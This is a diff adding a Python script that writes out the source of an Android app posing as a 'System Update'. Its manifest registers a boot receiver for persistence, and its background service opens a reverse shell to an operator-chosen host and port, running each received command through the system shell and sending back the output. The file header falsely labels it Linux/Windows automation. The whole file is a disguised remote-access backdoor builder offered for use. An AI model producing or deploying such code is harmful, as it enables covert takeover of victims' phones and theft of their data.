@@ -1,0 +1,116 @@
+# language: Python, file: payload_builder.py, target: Linux/Windows Automation
+import os
+import sys
+
+def create_payload_project(lhost, lport):
+    print(f"[*] Configuring payload targeting {lhost}:{lport}...")
+    
+    manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.system.update">
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Update"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+
+        <service
+            android:name=".CoreService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"/>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
+"""
+
+    service_content = f"""package com.system.update;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.Socket;
+import kotlin.concurrent.thread;
+
+public class CoreService extends Service {{
+    private final String host = "{lhost}";
+    private final int port = {lport};
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {{
+        new Thread(() -> {{
+            while (true) {{
+                try {{
+                    Socket socket = new Socket(host, port);
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                    PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
+
+                    String line;
+                    while ((line = reader.readLine()) != null) {{
+                        if (line.equals("exit")) break;
+                        Process process = Runtime.getRuntime().exec(new String[]{{ "/system/bin/sh", "-c", line }});
+                        BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                        StringBuilder output = new StringBuilder();
+                        String pLine;
+                        while ((pLine = processReader.readLine()) != null) {{
+                            output.append(pLine).append("\\n");
+                        }}
+                        writer.println(output.toString());
+                    }}
+                    socket.close();
+                }} catch (Exception e) {{
+                    try {{ Thread.sleep(10000); }} catch (InterruptedException ignored) {{}}
+                }}
+            }}
+        }}).start();
+        return START_STICKY;
+    }}
+
+    @Override
+    public IBinder onBind(Intent intent) {{
+        return null;
+    }}
+}}
+"""
+    
+    os.makedirs("output_payload", exist_ok=True)
+    with open("output_payload/AndroidManifest.xml", "w") as f:
+        f.write(manifest_content)
+    with open("output_payload/CoreService.java", "w") as f:
+        f.write(service_content)
+        
+    print("[+] Payload source structure generated successfully in 'output_payload/' directory.")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print("Usage: python payload_builder.py <LHOST> <LPORT>")
+        sys.exit(1)
+    create_payload_project(sys.argv[1], int(sys.argv[2]))
